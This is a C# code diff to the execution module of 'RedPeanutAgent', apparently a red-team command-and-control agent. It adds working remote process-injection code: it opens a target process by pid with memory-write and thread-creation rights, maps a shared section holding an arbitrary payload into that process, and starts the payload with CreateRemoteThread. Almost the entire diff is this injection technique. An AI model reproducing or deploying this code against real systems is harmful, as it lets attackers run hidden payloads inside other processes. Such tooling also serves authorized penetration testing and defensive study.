@@ -12,6 +12,65 @@ namespace RedPeanutAgent.Execution
 {
     class InjectionHelper
     {
+        public static bool Is64bit(int pid)
+        {
+            IntPtr hproc = OpenProcess(pid);
+
+            bool retVal;
+            if (!Natives.IsWow64Process(hproc, out retVal))
+            {
+                retVal = true;
+            }
+            Natives.CloseHandle(hproc);
+            return !retVal;            
+        }
+
+        public static bool OpenAndInject(int pid, byte[] payload)
+        {
+            IntPtr hproc = OpenProcess(pid);
+
+            uint size = InjectionHelper.GetSectionSize(payload.Length);
+
+            //Crteate section in current process
+            IntPtr section = IntPtr.Zero;
+            section = InjectionHelper.CreateSection(size);
+            if (section == IntPtr.Zero)
+            {
+                return false;
+            }
+
+            //Map section to current process
+            IntPtr baseAddr = IntPtr.Zero;
+            IntPtr viewSize = (IntPtr)size;
+            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
+            if (baseAddr == IntPtr.Zero)
+            {
+                return false;
+            }
+
+            //Copy payload to current process section
+            Marshal.Copy(payload, 0, baseAddr, payload.Length);
+
+            //Map remote section
+            IntPtr baseAddrEx = IntPtr.Zero;
+            IntPtr viewSizeEx = (IntPtr)size;
+            InjectionHelper.MapViewOfSection(section, hproc, ref baseAddrEx, ref viewSizeEx);
+            if (baseAddrEx == IntPtr.Zero || viewSizeEx == IntPtr.Zero)
+            {
+                return false;
+            }
+
+            if (!InjectionHelper.UnMapViewOfSection(baseAddr))
+            {
+                return false;
+            }
+
+            Natives.CreateRemoteThread(hproc, IntPtr.Zero, 0, baseAddrEx, IntPtr.Zero, 0, IntPtr.Zero);
+            Natives.CloseHandle(section);
+            Natives.CloseHandle(hproc);
+            return true;
+        }
+
         public static bool SapwnAndInject(string binary, byte[] payload)
         {
             Natives.PROCESS_INFORMATION procInfo = new Natives.PROCESS_INFORMATION();
@@ -143,6 +202,19 @@ namespace RedPeanutAgent.Execution
             Natives.CloseHandle(procInfo.hProcess);
 
             return true;
+        }
+
+        public static IntPtr OpenProcess(int pid)
+        {
+            IntPtr procHandle = Natives.OpenProcess(
+                Natives.ProcessAccessFlags.CreateThread | 
+                Natives.ProcessAccessFlags.QueryInformation |
+               Natives.ProcessAccessFlags.VirtualMemoryOperation |
+               Natives.ProcessAccessFlags.VirtualMemoryWrite |
+               Natives.ProcessAccessFlags.VirtualMemoryRead, 
+                false, 
+                pid);
+            return procHandle;
         }
 
         public static uint GetSectionSize(int plength)
